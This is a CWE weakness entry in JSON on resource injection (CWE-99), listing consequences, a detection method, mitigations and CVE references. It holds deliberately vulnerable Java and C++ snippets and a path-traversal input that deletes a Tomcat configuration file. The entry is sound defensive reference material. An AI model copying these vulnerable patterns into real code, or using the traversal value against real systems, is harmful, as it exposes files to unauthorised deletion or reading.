{"ID": "99", "Name": "Improper Control of Resource Identifiers ('Resource Injection')", "Abstraction": "Class", "Structure": "Simple", "Status": "Draft", "Description": "The product receives input from an upstream component, but it does not restrict or incorrectly restricts the input before it is used as an identifier for a resource that may be outside the intended sphere of control.", "ExtendedDescription": "\n\nA resource injection issue occurs when the following two conditions are met:\n\n\n  1. An attacker can specify the identifier used to access a system resource. For example, an attacker might be able to specify part of the name of a file to be opened or a port number to be used.\n\n  1. By specifying the resource, the attacker gains a capability that would not otherwise be permitted. For example, the program may give the attacker the ability to overwrite the specified file, run with a configuration controlled by the attacker, or transmit sensitive information to a third-party server.\n\nThis may enable an attacker to access or modify otherwise protected system resources.", "LikelihoodOfExploit": "High", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "74", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "PeerOf", "CweID": "706", "ViewID": "1000"}, {"Nature": "CanAlsoBe", "CweID": "73", "ViewID": "1000"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "AlternateTerms": [{"Term": "Insecure Direct Object Reference", "Description": "OWASP uses this term, although it is effectively the same as resource injection."}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Application Data", "Modify Application Data", "Read Files or Directories", "Modify Files or Directories"], "Note": "An attacker could gain access to or modify sensitive data or system resources. This could allow access to protected files or directories including configuration files and files containing sensitive information."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"MitigationID": "MIT-5", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, it can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n"}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "The following Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tString rName = request.getParameter(\"reportName\");\n\tFile rFile = new File(\"/usr/local/apfr/reports/\" + rName);\n\t...\n\trFile.delete();\n```"}]}, {"Entries": [{"IntroText": "The following code uses input from the command line to determine which file to open and echo back to the user. If the program runs with privileges and malicious users can create soft links to the file, they can use the program to read the first part of any file on the system."}, {"Nature": "Bad", "Language": "C++", "ExampleCode": "```\n\tifstream ifs(argv[0]);\n\tstring s;\n\tifs >> s;\n\tcout << s;\n```"}, {"BodyText": "The kind of resource the data affects indicates the kind of content that may be dangerous. For example, data containing special characters like period, slash, and backslash, are risky when used in methods that interact with the file system. (Resource injection, when it is related to file system resources, sometimes goes by the name \"path manipulation.\") Similarly, data that contains URLs and URIs is risky for functions that create remote connections."}]}], "ObservedExamples": [{"Reference": "CVE-2013-4787", "Description": "chain: mobile OS verifies cryptographic signature of file in an archive, but then installs a different file with the same name that is also listed in the archive.", "Link": "https://www.cve.org/CVERecord?id=CVE-2013-4787"}], "RelatedAttackPatterns": ["10", "240", "75"], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Notes": [{"Type": "Relationship", "Note": "Resource injection that involves resources stored on the filesystem goes by the name path manipulation (CWE-73)."}, {"Type": "Maintenance", "Note": "The relationship between CWE-99 and CWE-610 needs further investigation and clarification. They might be duplicates. CWE-99 \"Resource Injection,\" as originally defined in Seven Pernicious Kingdoms taxonomy, emphasizes the \"identifier used to access a system resource\" such as a file name or port number, yet it explicitly states that the \"resource injection\" term does not apply to \"path manipulation,\" which effectively identifies the path at which a resource can be found and could be considered to be one aspect of a resource identifier. Also, CWE-610 effectively covers any type of resource, whether that resource is at the system layer, the application layer, or the code layer."}], "Top25Examples": [{"Reference": "CVE-2022-1287", "Description": "A vulnerability classified as critical was found in School Club Application System 1.0. This vulnerability affects a request to the file /scas/classes/Users.php?f=save_user. The manipulation with a POST request leads to privilege escalation. The attack can be initiated remotely and does not require authentication. The exploit has been disclosed to the public and may be used."}]}
